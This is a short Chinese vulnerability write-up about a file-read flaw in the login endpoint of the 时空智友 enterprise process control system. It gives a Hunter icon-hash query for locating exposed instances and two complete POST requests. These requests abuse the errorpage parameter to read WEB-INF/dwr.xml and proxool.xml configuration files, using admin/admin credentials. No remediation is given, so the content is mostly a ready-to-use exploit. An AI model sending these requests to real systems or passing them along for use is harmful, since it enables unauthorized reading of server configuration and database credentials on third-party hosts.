# 时空智友企业流程化管控系统 login 文件读取漏洞

# 一、漏洞简介
时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。它旨在帮助企业实现流程的规范化、自动化和优化，从而提高工作效率、降低成本并提升管理水平。时空智友企业流程化管控系统login 文件读取漏洞，攻击者可利用该漏洞获取系统的敏感信息等。

# 二、影响版本
+ 时空智友企业流程化管控系统

# 三、资产测绘
+ hunter`web.icon=="2464cbce5dd2681dd4fb62d055520d78"`
+ 登录页面

![1693803612908-2a0fea76-532f-4ba1-87fa-4fc6bfae5cf3.png](./img/vMGuM8abSzeyEALd/1693803612908-2a0fea76-532f-4ba1-87fa-4fc6bfae5cf3-515017.png)

# 四、漏洞复现
```plain
POST /login HTTP/1.1
Host: xx.xx.xx.xx
Content-Length: 100
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

op=verify%7Clogin&targetpage=&errorpage=/WEB-INF/dwr.xml&mark=&tzo=480&username=admin&password=admin
```

![1700038270810-cb915d8f-d0a9-438a-bc87-e7e74156706a.png](./img/vMGuM8abSzeyEALd/1700038270810-cb915d8f-d0a9-438a-bc87-e7e74156706a-083560.png)

```plain
POST /login HTTP/1.1
Host: XX.XX.XX.XX
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzi
Content-Length: 111

op=verify%7Clogin&targetpage=&errorpage=WEB-INF/classes/proxool.xml&mark=&tzo=480&username=admin&password=admin
```



> 更新: 2024-02-29 23:55:50  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ln06lr49a314ww79>